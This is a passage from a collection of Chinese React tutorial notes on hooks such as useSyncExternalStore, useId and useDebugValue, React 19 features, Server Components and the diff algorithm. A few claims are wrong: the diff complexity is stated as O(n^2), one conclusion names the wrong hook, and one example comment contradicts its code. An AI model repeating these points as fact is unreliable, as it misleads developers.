**可能引起不必要的重新渲染**：如果依赖于外部变量或状态，可能会导致不必要的组件重新渲染。使用`useCallback`或`useMemo`可以一定程度上减少这样的重新渲染。\n\n## 8. 常见问题和解决方案\n\n### 8.1. ref 为空的问题\n\n```javascript hl:11\n// 错误示例\nconst Component = forwardRef((props, ref) => {\n  useImperativeHandle(ref, () => {\n    // 直接返回对象\n  });\n});\n\n// 正确示例\nconst Component = forwardRef((props, ref) => {\n  useImperativeHandle(ref, () => ({\n    // 返回方法对象\n  }));\n});\n```\n\n### 8.2. 依赖项更新问题\n\n```javascript hl:4,11\n// 错误示例\nuseImperativeHandle(ref, () => ({\n  someMethod: () => {\n    // 使用了外部变量但没有添加依赖\n  }\n}));\n\n// 正确示例\nuseImperativeHandle(ref, () => ({\n  someMethod: () => {\n    // 使用外部变量\n  }\n}), [dependency1, dependency2]);\n```\n\n","RqLZjADS":"\n# 使用 useSyncExternalStore 来连接外部状态和 React 组件\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- useSyncExternalStore 是 React 18 引入的一个 Hook，它允许你==订阅外部数据源==，并确保在`并发渲染特性`下数据的==一致性==\n\t- 比如：\n\t\t- localStorage 同步\n\t\t- 监听窗口大小\n\t\t- 自定义存储等\n\n## 2. 定义和基本概念\n\n### 2.1. 背景\n\n- 随着 React v18 引入并发模式，React 也支持了在处理多个任务时进行优先级调整，这意味着 React 可以“暂停”一个正在进行的渲染任务，切换到另一个更高优先级的任务，然后再回到原来的任务，这使得用户界面响应更快。\n- 但也带来了新的挑战，尤其是在状态管理方面——状态管理库需要**确保它们提供的状态始终是最新的和同步的**。\n- `useSyncExternalStore`就是为解决并发模式下的状态同步问题而推出的——它提供了一种方法，确保即使在并发更新的情况下，组件也可以同步地从外部存储中获取数据。\n- useSyncExternalStore 是 React 18 引入的一个 Hook，它允许你**订阅外部数据源**，并确保在`并发渲染特性`下数据的一致性。\n- 这个 Hook 主要用于连接外部状态 和 React 组件\n\n### 2.2. 基本语法\n\n```javascript\nconst snapshot = useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot?)\n```\n\n### 2.3. 参数说明\n\nuseSyncExternalStore 实际上是一个用于安全地连接`外部数据源`和 `React组件`的桥，如下图\n\n![图片&文件](./files/20241031.png)\n\n- subscribe：订阅函数，当**存储更改时**调用回调\n\t- 其作用是订阅外部存储的变化。当外部存储发生变化时，它应该调用传入的 `callback`\n\t- 这个函数应该`返回`一个取消订阅的函数。这样，当组件被卸载或订阅被重新创建时，我们可以确保没有内存泄漏或无效的回调调用\n- getSnapshot：返回**存储**当前值的函数\n\t- 其作用是从外部存储中获取当前的数据快照\n\t- 每次组件渲染时，`useSyncExternalStore`都会调用此函数来读取当前的数据状态\n- getServerSnapshot：（可选）返回服务器端初始值的函数\n\t- 与 `getSnapshot` 类似，但它是为服务端渲染（SSR）或 预渲染时使用的\n\t- 在客户端首次渲染或 hydrate 操作期间，React 会使用此函数而不是`getSnapshot`来读取数据的初始状态。这是为了确保在服务端渲染的内容与客户端的初始内容匹配，从而避免不必要的重新渲染和闪烁。\n\t- 如果你的应用不涉及服务端渲染，那么不需要这个参数。\n\n## 3. 主要使用场景\n\n1. 外部状态管理\n   - 订阅浏览器 API（如 localStorage、window size）\n   - 集成第三方状态管理库\n   - 自定义状态管理系统\n2. 并发渲染安全\n   - 需要在并发特性下保持数据一致性\n   - 处理外部数据源的订阅\n   - 确保渲染期间数据不变 \n\n## 4. 详细使用案例\n\n### 4.1. 案例1：监听窗口大小\n\n```javascript\nfunction useWindowSize() {\n  const getSnapshot = () => ({\n    width: window.innerWidth,\n    height: window.innerHeight\n  });\n\n  const subscribe = (callback) => {\n    window.addEventListener('resize', callback);\n    return () => window.removeEventListener('resize', callback);\n  };\n\n  return useSyncExternalStore(subscribe, getSnapshot);\n}\n\n// 使用示例\nfunction WindowSizeComponent() {\n  const size = useWindowSize();\n  \n  return (\n    <div>\n      Current window size: {size.width} x {size.height}\n    </div>\n  );\n}\n```\n\n### 4.2. 案例2：自定义存储\n\n```javascript\nconst createStore = (initialState) => {\n  let state = initialState;\n  const listeners = new Set();\n\n  return {\n    subscribe(listener) {\n      listeners.add(listener);\n      return () => listeners.delete(listener);\n    },\n    getSnapshot() {\n      return state;\n    },\n    setState(newState) {\n      state = typeof newState === 'function' ? newState(state) : newState;\n      listeners.forEach(listener => listener());\n    }\n  };\n};\n\nconst store = createStore({ count: 0 });\n\nfunction Counter() {\n  const state = useSyncExternalStore(\n    store.subscribe,\n    store.getSnapshot\n  );\n\n  return (\n    <div>\n      Count: {state.count}\n      <button onClick={() => store.setState(s => ({ count: s.count + 1 }))}>\n        Increment\n      </button>\n    </div>\n  );\n}\n```\n\n### 4.3. 案例3：localStorage 同步\n\n```javascript\nfunction useLocalStorage(key, initialValue) {\n  const getSnapshot = () => {\n    try {\n      const item = window.localStorage.getItem(key);\n      return item ? JSON.parse(item) : initialValue;\n    } catch (error) {\n      console.error(error);\n      return initialValue;\n    }\n  };\n\n  const subscribe = (callback) => {\n    window.addEventListener('storage', callback);\n    return () => window.removeEventListener('storage', callback);\n  };\n\n  const value = useSyncExternalStore(subscribe, getSnapshot);\n\n  const setValue = (newValue) => {\n    try {\n      const valueToStore = newValue instanceof Function ? newValue(value) : newValue;\n      window.localStorage.setItem(key, JSON.stringify(valueToStore));\n      window.dispatchEvent(new Event('storage'));\n    } catch (error) {\n      console.error(error);\n    }\n  };\n\n  return [value, setValue];\n}\n```\n\n## 5. 注意事项和最佳实践\n\n### 5.1. getSnapshot 应该返回不可变的值\n\n`useSyncExternalStore`依赖`getSnapshot`函数返回的值来决定是否重新渲染\n\n```javascript hl:2,10\nfunction getSnapshot() {\n  // 🔴 getSnapshot 不要总是返回不同的对象\n  return {\n    todos: myStore.todos\n  };\n}\n\n\nfunction getSnapshot() {\n  // ✅ 你可以返回不可变数据\n  return myStore.todos;\n}\n```\n\n### 5.2. 避免在每次渲染时创建新的订阅函数，所以 `subscribe`不要放在组件内定义\n\n正确的做法是把 `subscribe` 函数移到组件外部，这样它在组件的整个生命周期中都保持不变；或者使用 `useCallback` 钩子来缓存 `subscribe` 函数。\n\n### 5.3. 服务器端渲染\n\n```javascript\nconst useStore = (store) => {\n  return useSyncExternalStore(\n    store.subscribe,\n    store.getSnapshot,\n    // 服务器端快照\n    () => store.getServerSnapshot()\n  );\n};\n```\n\n### 5.4. 记得错误处理\n\n```javascript\nconst getSnapshot = () => {\n  try {\n    return someExternalAPI.getValue();\n  } catch (error) {\n    console.error('Failed to get snapshot:', error);\n    return defaultValue;\n  }\n};\n```\n\n## 6. 最后\n\n虽然`useImperativeHandle`对于应用开发者来说不是必要的，但如果你想拓展对 React 生态圈的认识，依然有必要了解一下`useImperativeHandle`的用法和使用场景，因为它能帮助你未来更好地理解优秀的第三方库的设计。","r4jgA5g5":"\n# 使用 useId 生成唯一的 ID 标识符\n\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- `useId` 是 React 18 引入的一个新 Hook，用于生成唯一的 ID 标识符\n- 在 `hydration` 过程中，服务器端和客户端生成的 ID 不一致，那么就会导致 hydration 失败\n\n## 2. 前置知识：React 的服务端渲染和客户端渲染之间的关系\n\n当你看到一个服务端渲染的应用，它的渲染过程会是这样：\n- 服务端会先生成 HTML，然后将这个 HTML 发送到客户端，\n\t- 在客户端，React 会进行一个叫做 `hydration` 的过程，即将服务器端生成的 HTML 和客户端的 DOM 进行匹配，并生成最终的 HTML\n\t- 如果在 `hydration` 过程中，**服务器端和客户端生成的 ID 不一致，，那么就会导致 hydration 失败**\n\n## 3. 定义和基本概念\n\nuseId 是 React 18 引入的一个新 Hook，用于生成唯一的 ID 标识符。它主要用于生成可访问性属性的唯一 ID，特别是在需要关联 HTML 元素的场景中。\n\n```javascript\nconst id = useId()\n```\n\n这个 Hook 的特点：\n\n- 返回一个唯一的字符串 ID\n- 在服务器端和客户端渲染时保持一致\n- 在同一个组件的多个实例中会生成不同的 ID\n- 不需要任何参数\n\n## 4.  ID 生成规则\n\n```javascript\n// React 内部实现（简化版）\nclass IdGenerator {\n  constructor() {\n    this.clientId = 0;    // 客户端计数器\n    this.serverId = 0;    // 服务端计数器\n  }\n\n  next() {\n    // 在服务器端和客户端使用相同的计数逻辑\n    const id = this.isServer ? this.serverId++ : this.clientId++;\n    return `:r${id}:`;\n  }\n}\n\n```\n\n## 5. React 内部水合过程（简化示意）\n\n```javascript\n// React 内部水合过程（简化示意）\nfunction hydrateRoot(container, element) {\n  // 1. 获取服务器渲染的 HTML\n  const serverHTML = container.innerHTML;\n\n  // 2. 创建新的 React 树\n  const root = createRoot(container);\n\n  // 3. 开始水合过程\n  root.hydrate(element, {\n    onHydrationMismatch: (serverNode, clientNode) => {\n      // 如果发现不匹配，会触发警告\n      if (serverNode.id !== clientNode.id) {\n        console.error(\n          \"Hydration mismatch: Server generated ID\",\n          serverNode.id,\n          \"but client generated\",\n          clientNode.id,\n        );\n      }\n    },\n  });\n}\n\n\n```\n\n## 6. 如何保证SSR和CSR就会生成完全相同的 ID 序列\n\n1. 服务端和客户端使用相同的遍历顺序\n2. 相同位置的 useId 调用获得相同的槽位\n3. 相同槽位生成相同的 ID\n4. 水合过程中可以完美匹配\n\n```jsx\n// 1. 组件定义\nfunction Layout() {\n  const id = useId(); // slot: \"Layout\"\n  return <Main />;\n}\n\nfunction Main() {\n  const id = useId(); // slot: \"Layout.Main\"\n  return <Form />;\n}\n\nfunction Form() {\n  const id = useId(); // slot: \"Layout.Main.Form\"\n  return (\n    <input id={`${id}-input`} />\n  );\n}\n\n// 2. 渲染过程\nconst app = (\n  <Layout>\n    <Main>\n      <Form />\n    </Main>\n  </Layout>\n);\n\n// 3. 服务端渲染\n// - 遍历组件树\n// - 为每个 useId 调用生成槽位\n// - 生成 HTML\n\n// 4. 客户端水合\n// - 使用相同的遍历顺序\n// - 匹配已有的 HTML\n// - 复用相同的 ID\n\n```\n\n## 7. 注意事项\n\n### 7.1. 调用位置限制\n\n- 只能在组件的顶层调用\n- 不能在循环、条件或嵌套函数中调用\n   ```javascript\n   // ❌ 错误示例\n   if (condition) {\n     const id = useId();\n   }\n\n   // ✅ 正确示例\n   const id = useId();\n   if (condition) {\n     // 使用 id\n   }\n   ```\n\n### 7.2. 不要用于列表 key\n\n   - useId 不是为生成列表 key 而设计的\n   - 列表 key 应该使用数据的唯一标识符\n   ```javascript\n   // ❌ 错误示例\n   items.map(() => {\n     const id = useId();\n     return <li key={id}>...</li>\n   });\n\n   // ✅ 正确示例\n   items.map((item) => (\n     <li key={item.id}>...</li>\n   ));\n   ```\n\n### 7.3. 前缀使用\n\n   - 可以添加前缀来避免命名冲突\n   ```javascript\n   const id = useId();\n   const prefix = 'app';\n   const elementId = `${prefix}-${id}`;\n   ```\n\n### 7.4. 服务器端渲染注意事项\n\n   - 确保服务器和客户端使用相同的 React 版本\n   - 不要手动构造 ID 字符串\n   - 使用相同的组件结构\n","5usi6oMy":"\n# 把 useDebugValue 加入你的React调试工具库\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- useDebugValue(value, formatFn?) ：用于在 DevTools 中显示当前值\n\t- value: 要显示的调试值\n\t- formatFn: (可选) 格式化函数，用于格式化调试值\n\n## 2. useDebugValue 基本介绍\n\n`useDebugValue` 是一个用于在 **React DevTools** 中显示自定义 hook 标签的 Hook。它的主要目的是帮助开发者在调试时更好地理解自定义 Hook 的内部状态\n\n### 2.1. 基本语法\n\n```javascript\nuseDebugValue(value, formatFn?)\n```\n\n参数说明：\n\n- value: 要显示的调试值\n- formatFn: (可选) 格式化函数，用于格式化调试值\n\n## 3. 使用方法\n\n### 3.1. 基本使用\n\n```javascript\nfunction useCustomHook(initialValue) {\n  const [value, setValue] = useState(initialValue);\n  \n  // 在 DevTools 中显示当前值\n  useDebugValue(value);\n  \n  return [value, setValue];\n}\n\n// 使用这个 hook\nfunction MyComponent() {\n  const [value, setValue] = useCustomHook('initial');\n  return <div>{value}</div>;\n}\n```\n\n### 3.2. 使用格式化函数\n\n```javascript\nfunction useUserStatus(userId) {\n  const [isOnline, setIsOnline] = useState(false);\n  \n  useDebugValue(isOnline, (online) => \n    online ? 'Online' : 'Offline'\n  );\n  \n  return isOnline;\n}\n```\n\n### 3.3. 复杂对象的格式化\n\n```javascript\nfunction useDataFetching(url) {\n  const [data, setData] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n  \n  useDebugValue(\n    { data, loading, error },\n    state => ({\n      status: state.loading ? 'loading' : state.error ? 'error' : 'success',\n      dataLength: state.data?.length || 0,\n      errorMessage: state.error?.message\n    })\n  );\n  \n  useEffect(() => {\n    fetch(url)\n      .then(res => res.json())\n      .then(data => {\n        setData(data);\n        setLoading(false);\n      })\n      .catch(err => {\n        setError(err);\n        setLoading(false);\n      });\n  }, [url]);\n  \n  return { data, loading, error };\n}\n```\n\n## 4. 实际示例：带图\n\n```javascript\nexport function useOnlineStatus() {\n  const isOnline = useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot);\n  // useDebugValue\n  useDebugValue(isOnline ? \"✅ Online(useDebugValue)\" : \"❌ Disconnected(useDebugValue)\")\n  return isOnline;\n}\n```\n\n![undefined](#)","eaLOnm9U":"\n# 说说 React 19 的最新的进展\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- use hook\n\t- 可以在循环和条件语句中调用\n- 支持在 React 代码里编写 document metadata，即在页面组件编写`<title>` `<link>` 和 `<meta>` 标签会自动添加应用的 `<head>` 上面\n- 新指令\n\t- `'use client'` 标记仅在客户端运行的代码。\n\t- `'use server'` 标记可以从客户端代码调用的服务器端函数\n- useOptimistic 乐观更新\n\t- 比如点赞\n- 预加载能力：`import { prefetchDNS, preconnect, preload, preinit} from \"react-dom\";`\n- 等等\n\n## 1. use hook\n\n- 不同于所有其他的 React 钩子，`use` 可以在循环和条件语句中调用，比如 `if`\n\n### 1.1. use(Context)\n\n```tsx hl:4\nimport { use } from \"react\";\nfunction HorizontalRule({ show }) {\n  if (show) {\n    const theme = use(ThemeContext);\n    return <hr className={theme} />;\n  }\n  return false;\n}\n```\n\n### 1.2. use(Promise)\n\n```jsx\nimport { use } from 'react';\nfunction MessageComponent({ messagePromise }) {\n    const message = use(messagePromise);\n    // ...\n}\n```\n\n## 2. 新指令\n\n- `'use client'` 标记仅在客户端运行的代码。\n- `'use server'` 标记可以从客户端代码调用的服务器端函数\n\n## 3. useActionState\n\n这个钩子简化了表单状态和表单提交的管理。通过使用 Actions，它捕获表单输入数据，处理验证和错误状态，减少了自定义状态管理逻辑的需求。这个钩子还暴露了一个状态，可以在执行操作时显示加载指示器\n\n```jsx hl:9\nimport { useActionState } from \"react\";\nimport { createUser } from \"./actions\";\n\nconst initialState = {\n  message: \"\",\n};\n\nexport function Signup() {\n  const [state, formAction, pending] = useActionState(createUser, initialState);\n\n  return (\n    <form action={formAction}>\n      <label htmlFor=\"email\">Email</label>\n      <input type=\"text\" id=\"email\" name=\"email\" required />\n      {/* ... */}\n      {state?.message && <p aria-live=\"polite\">{state.message}</p>}\n      <button aria-disabled={pending} type=\"submit\">\n        {pending ? \"Submitting...\" : \"Sign up\"}\n      </button>\n    </form>\n  );\n}\n\n```\n\n## 4. useFormStatus\n\n这个钩子管理最后一次表单提交的状态，必须在一个也在表单内的组件中调用\n\n```tsx hl:1\nimport { useFormStatus } from \"react-dom\";\nimport action from \"./actions\";\n\nfunction Submit() {\n  const status = useFormStatus();\n  return <button disabled={status.pending}>Submit</button>;\n}\n\nexport default function App() {\n  return (\n    <form action={action}>\n      <Submit />\n    </form>\n  );\n}\n\n```\n\n## 5. useOptimistic 乐观更新\n\n是一种在前端开发中`常用的处理异步操作反馈的策略`。\n\n它基于一种“乐观”的假设：即假设无论我们向服务器发送什么请求，这些操作都将成功执行，因此在得到服务器响应之前，我们就提前在用户界面上渲染这些改变。\n\n使用场景：点赞、评论、任务添加编辑等。\n\nuseOptimistic 会在异步操作进行时先渲染预期的结果，等到异步操作完成，状态更新后，再渲染真实的返回结果（无论成功和失败）\n\n## 6. 预加载资源\n\n```javascript\n// React code\nimport { prefetchDNS, preconnect, preload, preinit} from \"react-dom\";\n\nfunction MyComponent() {\n  preinit(\"https://.../path/to/some/script.js\", { as: \"script\" });\n  preload(\"https://.../path/to/some/font.woff\", { as: \"font\" });\n  preload(\"https://.../path/to/some/stylesheet.css\", { as: \"style\" });\n  prefetchDNS(\"https://...\");\n  preconnect(\"https://...\");\n}\n```\n\n## 7. 样式加载支持\n\n```javascript hl:4\nfunction ComponentOne() {\n  return (\n    <Suspense fallback=\"loading...\">\n      <link rel=\"stylesheet\" href=\"one\" precedence=\"default\" />\n      <link rel=\"stylesheet\" href=\"two\" precedence=\"high\" />\n      <article>...</article>\n    </Suspense>\n  );\n}\n\nfunction ComponentTwo() {\n  return (\n    <div>\n      <p>...</p>\n      {/* Stylesheet \"three\" below will be inserted between \"one\" and \"two\" */}\n      <link rel=\"stylesheet\" href=\"three\" precedence=\"default\" />\n    </div>\n  );\n}\n\n```\n\n## 8. 异步脚本支持\n\n```tsx hl:4\nfunction Component() {\n  return (\n    <div>\n      <script async={true} src=\"...\" />\n      // ...\n    </div>\n  );\n}\n\nfunction App() {\n  return (\n    <html>\n      <body>\n        <Component>// ...</Component> // Won't duplicate script in the DOM\n      </body>\n    </html>\n  );\n}\n\n```\n\n## 9. 更好的支持 web Componets \n\n自定义元素允许开发者将自己的 HTML 元素定义为 Web Components 规范的一部分。\n\n在之前的 React 版本中，使用自定义元素很困难，因为 React 将未识别的属性视为属性而不是属性。\n\n## 10. 服务端组件：SRC\n\n服务端组件和 `server actions` 将成为稳定特性，这两个概念属于熟悉 Next.js/Remix 的人已经烂熟于心，而不用 Next.js/Remix 的人根本用不到\n\n更到参考 [40. React Server Components (RSC)](/post/bx1lKiqY.html)\n\n## 11. ref 抛弃 forwardRef\n\n## 12. 支持在 React 代码里编写 document metadata\n\n支持在 React 代码里编写 document metadata，即在页面组件编写`<title>` `<link>` 和 `<meta>` 标签会自动添加应用的 `<head>` 上面\n\n## 13. context 可当作 provider\n\n从在 React 19 开始，开发者可以直接将 `<Context>` 直接作为 provider，而不是使用 `<Context.Provider>`","EG3l3URg":"\n# 为什么不应该在循环、条件或嵌套函数中使用 Hooks\n\n`#React` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 每个==组件内部==维护着一个 `hooks 链表`\n\t- 保证：每次渲染时，Hooks 都需要按照完全相同的顺序被调用\n\t\t- 所以循环或者条件，会导致意外错误\n\n## 2. Hooks 的工作原理\n\n- React Hooks 依赖于`调用顺序`来维护内部状态\n- 每个组件内部维护着一个 `hooks 链表`\n- 每次渲染时，Hooks 都需要按照完全相同的顺序被调用\n\n## 3. 解决方案\n\n- 将 Hook 的调用放在组件的`最顶层`\n- 使用条件渲染而不是条件式的 `Hook`\n- 使用自定义 Hook 封装复杂逻辑\n- 使用`数组和对象`存储多个相关状态\n\n## 4. ESLint 规则\n\n- 使用 `eslint-plugin-react-hooks` 可以自动检查这些问题\n\t- 也会检测`闭包陷阱`\n- 该插件会强制执行 Hooks 的使用规则\n- 推荐在项目中配置这个 ESLint 插件\n\n## 5. 为什么这个规则这么严格\n\n- 确保 Hook 状态的可预测性\n- 保证组件的正确渲染\n- 避免难以调试的问题\n- 维护 React 的内部状态管理机制\n\n## 6. 总结\n\n- 不在循环、条件和嵌套函数中使用 Hook 的规则是为了\n\t- **确保 Hooks 在每次渲染时都以相同的顺序被调用**。\n- 这是 React Hooks 工作机制的**核心要求**，\n\t- 违反这个规则可能导致状态管理混乱、组件行为不可预测等问题。\n- 通过遵守这个规则，我们可以确保组件的状态管理始终保持正确和可预测。","bx1lKiqY":"\n# React Server Components (RSC)\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- React Server Components (RSC)：\n\t- 服务器上运行的 React 组件\n- 一切不需要交互的内容都应当放到服务端\n\t- 比如 markdown\n- 三种组件类型\n\t- 默认：服务端组件\n\t- 客户端组件：\n\t\t- 使用`'use client';`标识\n\t- 共享组件\n\t\t- 可在服务端和客户端都能使用的组件\n- 区别\n\t- 服务器组件限制：\n\t\t- 不能使用 useState、useEffect 等客户端 hooks\n\t\t- 不能访问浏览器 API\n\t\t- 不能添加事件处理器\n\t- 客户端组件限制：\n\t\t- 不能直接导入服务器组件\n\t\t- 需要通过 props 接收服务器组件\n\t- 数据获取注意事项：\n\t\t- 服务器组件中可以直接使用 async/await\n\t\t- 客户端组件需要使用传统的数据获取方式\n\t- 服务器组件不能使用像 `useState` 和 `useEffect` 这样的 React hook；客户端则可以\n\t- 服务器组件无权访问浏览器 API；客户端有完整的浏览器 API 权限；\n\t- 服务端有权限直接访问服务端程序和 API；而客户端组件只能通过请求访问部分程序。\n- `UI = f(data, state)`\n\t- 客户端组件的工作是 `UI = f(state)`\n\t- 服务端组件的工作是 `UI = f(data)`\n\t- React 希望组合二者的优势，实现 `UI = f(data, state)`\n\n## 1. RSC 基本概念\n\nReact Server Components 允许开发者编写在服务器上运行的 React 组件，这些组件可以：\n- 直接访问服务器资源（数据库、文件系统等）\n- 减少客户端 JavaScript 包大小\n- 保持良好的交互性\n\nRSC 每次预渲染后把 HTML 发送到客户端，由客户端进行水合（hydrate）并正式渲染。\n\n这种做法的好处是，一部分原本要打包在客户端 JavaScript 文件里的代码，现在可以放在服务端运行了，从而减轻客户端的负担，提升应用的整体性能和响应速度。\n\nReact 19 带来了 RSC 的稳定版本，主要特性包括：\n\n1. 稳定性提升：RSC 在 React 19 中被标记为稳定特性\n2. 性能优化：通过预取机制提升客户端更新速度\n3. 更好的开发者体验：改进了错误处理和调试功能\n\n## 2. 一切不需要交互的内容都应当放到服务端？\n\n比如 markdown 渲染就很适合\n\n```javascript hl:2,12\n\n// 客户端组件渲染\n\nimport marked from 'marked'; // 35.9K (11.2K gzipped)\nimport sanitizeHtml from 'sanitize-html'; // 206K (63.3K gzipped)\n\nfunction NoteWithMarkdown({text}) {\n  const html = sanitizeHtml(marked(text));\n  return (/* 渲染 */);\n}\n\n// 服务器组件渲染\n \nimport marked from 'marked'; // 零打包大小\nimport sanitizeHtml from 'sanitize-html'; // 零打包大小\n \nfunction NoteWithMarkdown({text}) {\n  // 与之前相同\n}\n```\n\n## 3. 三种组件类型\n\n### 3.1. 服务器组件 (默认)\n\n```jsx\n// 1. 服务器组件 (默认)\n// 文件: app/page.js\nasync function ServerComponent() {\n  const data = await fetch('api/data');\n  return <div>{data}</div>;\n}\n```\n\n### 3.2. 客户端组件\n\n```javascript\n// 2. 客户端组件\n// 文件: components/client.js\n'use client';\nfunction ClientComponent() {\n  const [count, setCount] = useState(0);\n  return <button onClick={() => setCount(count + 1)}>{count}</button>;\n}\n```\n\n### 3.3. 共享组件\n\n```tsx\n// 3. 共享组件\n// 可在服务端和客户端都能使用的组件\nfunction SharedComponent({ children }) {\n  return <div className=\"shared\">{children}</div>;\n}\n```\n\n### 3.4. 主要区别\n\n- 服务器组件限制：\n\t- 不能使用 useState、useEffect 等客户端 hooks\n\t- 不能访问浏览器 API\n\t- 不能添加事件处理器\n- 客户端组件限制：\n\t- 不能直接导入服务器组件\n\t- 需要通过 props 接收服务器组件\n- 数据获取注意事项：\n\t- 服务器组件中可以直接使用 async/await\n\t- 客户端组件需要使用传统的数据获取方式\n- 服务器组件不能使用像 `useState` 和 `useEffect` 这样的 React hook；客户端则可以\n- 服务器组件无权访问浏览器 API；客户端有完整的浏览器 API 权限；\n- 服务端有权限直接访问服务端程序和 API；而客户端组件只能通过请求访问部分程序。\n- `UI = f(data, state)`\n\t- 客户端组件的工作是 `UI = f(state)`\n\t- 服务端组件的工作是 `UI = f(data)`\n\t- React 希望组合二者的优势，实现 `UI = f(data, state)`\n\n## 4. CSS 处理\n\n### 4.1. 服务器组件中的 CSS\n\n- 支持 CSS Modules\n- 支持全局 CSS 导入\n- 支持 CSS-in-JS 的静态部分\n\n### 4.2. 客户端组件中的 CSS\n\n- 支持所有传统的 CSS 方案\n- 动态样式需要在客户端组件中处理\n\n## 5. Remix 与 Next.js\n\n- 当前 React 更新缓慢，反而是两个上层框架 Remix（由 Shopify 资助）和 Next.js（由 Vercel 资助）在激烈竞争。\n\n## 6. 简单示例\n\n```javascript\n// 1. 服务器端\nasync function BlogPost({ id }) {\n  // 直接访问数据库\n  const post = await db.posts.findById(id);\n  const author = await db.users.findById(post.authorId);\n  \n  return (\n    <article>\n      <h1>{post.title}</h1>\n      <AuthorInfo author={author} />\n      {/* 客户端组件处理交互 */}\n      <ClientLikeButton initialLikes={post.likes} />\n    </article>\n  );\n}\n\n// 2. 客户端组件\n'use client';\nfunction ClientLikeButton({ initialLikes }) {\n  const [likes, setLikes] = useState(initialLikes);\n  \n  return (\n    <button onClick={() => setLikes(likes + 1)}>\n      Like ({likes})\n    </button>\n  );\n}\n```\n","xnovmtPU":"\n# React 的 Diff 算法\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- diff 算法的本质就是，对比 `current Filber` 与 JSX 生成 `workInProgress Fiber`\n- 复杂度 O(n^3) → O(n^2) \n\t- 只做统计比较\n\t- 只做类型比较\n\t- 同级使用 key\n- 仅仅右移策略\n\t- 主要针对 ==两个列表 Diff==\n- 不同操作的优先级是不同的\n\t- 第一遍遍历\n\t\t- 先处理 ==更新==\n\t- 第二遍遍历：\n\t\t- 处理不属于 `更新` 的节点，比如`新增`、`删除`\n\n## 2. 基本流程\n\n![图片&文件](./files/20241101.png)\n\n### 2.1. 示例 1：删除一个节点 `a`\n\n![图片&文件](./files/20241101-1.png)\n\n### 2.2. 示例 2：`vdom` 到 `真实 DOM` 代码示例\n\n```javascript\n// 1. 构建虚拟DOM\nvar tree = el(\"div\", { id: \"container\" }, [\n  el(\"h1\", { style: \"color: blue\" }, [\"simple virtal dom\"]),\n  el(\"p\", [\"Hello, virtual-dom\"]),\n  el(\"ul\", [el(\"li\")]),\n]);\n\n// 2. 通过虚拟 DOM 构建真正的 DOM\nvar root = tree.render();\ndocument.body.appendChild(root);\n\n// 删除了一个 li \n\n// 3. 生成新的虚拟 DOM\nvar newTree = el(\"div\", { id: \"container\" }, [\n  el(\"h1\", { style: \"color: red\" }, [\"simple virtal dom\"]),\n  el(\"p\", [\"Hello, virtual-dom\"]),\n  el(\"ul\", [el(\"li\"), el(\"li\")]),\n]);\n\n// 4. 比较两棵虚拟DOM树的不同\nvar patches = diff(tree, newTree);\n\n// 5. 在真正的DOM元素上应用变更\npatch(root, patches);\n```\n\n## 3. 复杂度为什么是O(n^3) 及 怎么做到 O(n^2) 的？\n\n![图片&文件](./files/20241101-2.png)\n\n下面展开说说\n\n### 3.1. 只做同级比较：tree diff\n\n当出现节点`跨层级的移动`时，并不会出现想象中移动操作，而是`删了重建`，如下图：\n\n![图片&文件](./files/20241101-4.png)\n\n> Web UI 中 DOM 节点跨层级的移动操作特别少，可以忽略不计\n\n### 3.2. 只做类型比较：Component Diff\n\n![图片&文件](./files/20241101-5.png)\n\n### 3.3. Element Diff：同级使用 `key`\n\n- 在进行组件对比的时候，如果`两个组件类型相同`，则需要进行元素级别的对比，这叫做 `Element Diff`\n- React 提出优化策略：允许开发者对同一层级的同组子节点，添加唯一 key 进行区分\n\n#### 3.3.1. 示例\n\n- newList：`['B', 'C', 'A', 'D']`\n- oldList：`['A', 'B', 'C', 'D']`\n- Diff 过程：\n    - 所以 `lastIndex` 代表访问过的节点最大索引\n    - 遍历 `newList`\n    - 遍历到 `B`\n        - 在 `oldList` 中查找相同的元素 `B` 的位置是 `1` \n            - 如果`当前节点在老集合中的位置`小于 `lastIndex `，说明需要移动\n                - 而 `1 > 0` 所以不需要移动\n            - 否则，不需要移动，更新 `lastIndex = 1`\n        - 所以，'B' 位置变化：不需要移动（lastIndex = 1）\n    - 'C' 位置变化：不需要移动（lastIndex = 2）\n    - 'A' 发现需要移动：因为它的原始位置(0) 小于 lastIndex(2)\n    - 'D' 位置不变：保持不动\n\n#### 3.3.2. 完整代码如下\n\n```javascript hl:6,10,37\n// 简化版的 React Diff 算法中的移动逻辑\nfunction updateChildren(oldList, newList) {\n  // 记录访问过的节点最大索引\n  let lastIndex = 0;\n\n  // 遍历新的子元素\n  for (let i = 0; i < newList.length; i++) {\n    const newChild = newList[i];\n    let found = false;\n    // 在老的子元素中查找相同的元素\n    for (let j = 0; j < oldList.length; j++) {\n      const prevChild = oldList[j];\n\n      // 找到相同的元素（通过 key 判断）\n      if (newChild.key === prevChild.key) {\n        found = true;\n\n        // 如果当前节点在老集合中的位置小于最大索引，说明需要移动\n        if (j < lastIndex) {\n          // 需要移动\n          // 在实际 DOM 操作中，将这个节点移动到当前位置\n          move(prevChild, currentPosition);\n        } else {\n          // 不需要移动，更新 lastIndex\n          lastIndex = j;\n        }\n        break;\n      }\n    }\n\n    // 如果没找到，说明是新元素，需要插入\n    if (!found) {\n      insert(newChild, currentPosition);\n    }\n  }\n\n  // 移除老集合中剩余的元素\n  for (let i = 0; i < oldList.length; i++) {\n    const prevChild = oldList[i];\n    if (!newList.find((child) => child.key === prevChild.key)) {\n      remove(prevChild);\n    }\n  }\n}\n\n```\n\n#### 3.3.3. 算法分析\n\n- 通过**限制移动方向**，简化了算法复杂度，即**仅右移**\n- 虽然可能不是最优解，但是在大多数情况下都能得到不错的性能\n\n#### 3.3.4. 注意点\n\n1. 始终为列表项提供稳定的 key\n2. 避免使用数组索引作为 key \n\n## 4. 源码中 Diff 算法位置\n\n![图片&文件](./files/20241101-3.png)\n\n## 5. 一个简单的 Diff 算法\n\n```javascript\nconst 